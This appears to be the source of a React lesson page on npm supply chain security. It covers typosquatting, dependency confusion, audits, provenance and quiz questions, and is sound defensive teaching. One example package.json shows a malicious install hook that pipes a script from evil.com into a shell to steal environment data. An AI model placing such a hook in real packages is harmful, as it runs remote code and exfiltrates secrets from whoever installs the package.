import CodeBlock from '../../components/CodeBlock';
import FlowChart from '../../components/FlowChart';
import InfoBox from '../../components/InfoBox';
import InteractiveChallenge from '../../components/InteractiveChallenge';
import LessonLayout from '../../components/LessonLayout';

export default function NpmSecurity() {
  return (
    <LessonLayout
      title="npm Security"
      sectionId="npm-deep-dive"
      lessonIndex={5}
      prev={{ path: '/npm-deep-dive/scripts', label: 'npm Scripts' }}
      next={null}
    >
      <h2>npm Security Overview</h2>
      <p>
        The npm ecosystem's open nature makes it a target for supply chain attacks. Understanding the
        attack vectors and defenses helps you make safer dependency decisions.
      </p>

      <FlowChart
        title="Supply Chain Attack Vectors"
        chart={"graph TD\n  A[Attack Vectors] --> B[Typosquatting]\n  A --> C[Dependency Confusion]\n  A --> D[Maintainer Account Takeover]\n  A --> E[Malicious postinstall]\n  A --> F[Protestware]\n  B --> G[Mitigations]\n  C --> G\n  D --> G\n  E --> G\n  F --> G\n  G --> H[Audit regularly]\n  G --> I[Lock files]\n  G --> J[Scope packages]\n  G --> K[Review deps before install]"}
      />

      <h2>npm audit</h2>

      <CodeBlock language="bash" title="Running security audits">
{`# Check for known vulnerabilities
npm audit

# Output example:
# ✗ Critical 1
#   Prototype Pollution in minimist
#   Package: minimist < 0.2.4
#   Severity: critical
#   Fix: npm audit fix

# Fix compatible vulnerabilities (within semver range)
npm audit fix

# Force upgrade major versions (may break things — review first!)
npm audit fix --force

# Fail CI on any vulnerability above a threshold
npm audit --audit-level=moderate   # exit code 1 on moderate+
npm audit --audit-level=high       # exit code 1 on high+
npm audit --audit-level=critical   # exit code 1 on critical only

# Get JSON output for programmatic processing
npm audit --json

# For pnpm:
pnpm audit --audit-level moderate`}
      </CodeBlock>

      <h2>Common Attack Types</h2>

      <CodeBlock language="bash" title="Typosquatting">
{`# Typosquatting: malicious packages with names similar to popular ones
# Real examples:
# crossenv     (vs cross-env)
# nodmailer    (vs nodemailer)
# momnet       (vs moment)

# Defense:
# - Double-check package names before installing
# - Use organizations/@scope for internal packages
# - Audit installed packages with depcheck`}
      </CodeBlock>

      <CodeBlock language="bash" title="Dependency confusion attack">
{`# Dependency confusion: attacker uploads a public package
# with the same name as your private scoped package but higher version

# Example attack:
# Your company uses: @mycompany/utils@1.0.0 (private registry)
# Attacker publishes: @mycompany/utils@2.0.0 (public npm registry)
# If npm checks public registry first, it installs the malicious version

# Defense:
# 1. Use organization scopes: @mycompany/package
#    and configure npm to ALWAYS use private registry for that scope
# .npmrc:
# @mycompany:registry=https://my-private-registry.com

# 2. Use private registry with transparent proxy mode
#    (blocks public packages that match private names)

# 3. Lock package versions in overrides`}
      </CodeBlock>

      <CodeBlock language="bash" title="Malicious postinstall scripts">
{`# Packages can run code during npm install via lifecycle scripts:
{
  "scripts": {
    "install": "curl https://evil.com/steal-env.sh | sh"
  }
}

# Real examples: event-stream attack (2018), ua-parser-js, node-ipc

# Defense:
# 1. Review package code before installing unknown packages
# 2. Use --ignore-scripts flag for CI
npm install --ignore-scripts

# 3. Use Socket.dev or Snyk to scan packages
# 4. Avoid packages with unusual postinstall scripts

# Audit new packages before adding:
npx socket npx-cli install some-package  # Socket scans it first`}
      </CodeBlock>

      <h2>Keeping Dependencies Updated</h2>

      <CodeBlock language="bash" title="Managing updates safely">
{`# Check outdated packages
npm outdated

# Output:
# Package         Current  Wanted  Latest
# react            18.2.0  18.2.0  18.3.1
# vite              5.0.0   5.4.2   6.0.0

# "Wanted" = latest within semver range (safe to update)
# "Latest" = latest published (may be major upgrade)

# Update to "wanted" versions
npm update

# Interactively choose updates
npx npm-check-updates --interactive
# OR
npx ncu -u    # writes updated versions to package.json
npm install   # then regenerate lock file

# Automate dependency updates: Dependabot (GitHub) or Renovate
# .github/dependabot.yml:
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 10`}
      </CodeBlock>

      <h2>Package Provenance and Signing</h2>

      <CodeBlock language="bash" title="npm provenance">
{`# npm 9.5+ supports package provenance
# Cryptographically links a published package to its source code + CI build

# When publishing with provenance (from GitHub Actions):
npm publish --provenance

# Verify provenance of a package:
npm audit signatures

# Output:
# audited 150 packages in 2.3s
# 150 packages have verified registry signatures
# 10 packages have verified attestations
# 0 packages have invalid signatures

# Check a specific package's provenance:
npm info some-package --json | jq '.dist.attestations'`}
      </CodeBlock>

      <h2>Security Best Practices</h2>

      <CodeBlock language="bash" title="Security checklist">
{`# 1. Run npm audit in CI
# .github/workflows/ci.yml:
- run: npm audit --audit-level=moderate

# 2. Use exact versions for critical dependencies
npm install react --save-exact
# Results in: "react": "18.2.0" (no caret/tilde)

# 3. Set up Dependabot or Renovate for automated PRs

# 4. Use private registry with authentication for internal packages

# 5. Verify new packages before installing:
npx socket scan              # Socket.dev deep analysis
npx snyk test                # Snyk vulnerability scan
npx is-website-vulnerable https://mysite.com  # Retirejs style check

# 6. Two-factor authentication on npm account
npm profile enable-2fa auth-and-writes

# 7. Use organizations for scoped packages
npm org create my-company
npm access grant read-write my-company:developers my-company/my-package

# 8. Minimize permission scope for automation tokens
npm token create --read-only              # for CI that only downloads
npm token create --cidr=10.0.0.0/8        # restrict to IP range`}
      </CodeBlock>

      <InfoBox variant="danger" title="Never Store Secrets in package.json">
        <p>
          The <code>package.json</code> file is committed to source control and included in published packages.
          Never put API keys, passwords, or tokens in <code>package.json</code> or <code>.npmrc</code> that is
          committed. Use environment variables and <code>.env</code> files (gitignored) instead.
          Check <code>.npmrc</code> is in your <code>.gitignore</code> if it contains auth tokens.
        </p>
      </InfoBox>

      <InteractiveChallenge
        question="What is a dependency confusion attack in npm?"
        options={[
          "Installing incompatible versions of the same package in different workspaces",
          "Uploading a malicious public package with the same name as a private internal package at a higher version",
          "Creating a circular dependency that causes infinite resolution loops",
          "Publishing a package that shadows a Node.js built-in module"
        ]}
        correctIndex={1}
        explanation="In a dependency confusion attack, an attacker publishes a package to the public npm registry with the same name as an organization's private package but at a higher version number. If npm's resolution checks the public registry alongside the private one without proper scoping, it may install the higher-versioned public (malicious) package instead. Defense: always use scoped package names (@myorg/package) and configure .npmrc to route that scope exclusively to your private registry."
      />

      <InteractiveChallenge
        question="What does 'npm audit fix --force' do and why should you be careful with it?"
        options={[
          "It runs the fix with elevated system permissions",
          "It upgrades packages to the latest major version even if that introduces breaking changes",
          "It ignores vulnerability advisories marked as false positives",
          "It reinstalls all packages from scratch to ensure clean state"
        ]}
        correctIndex={1}
        explanation="npm audit fix --force upgrades packages to the minimum version that resolves the vulnerability, even if that means crossing a major version boundary (e.g., package@1.x to package@2.x). Major version bumps can introduce breaking API changes. Always review what --force would change with 'npm audit fix --dry-run' first and test thoroughly after applying the forced fix."
      />
    </LessonLayout>
  );
}
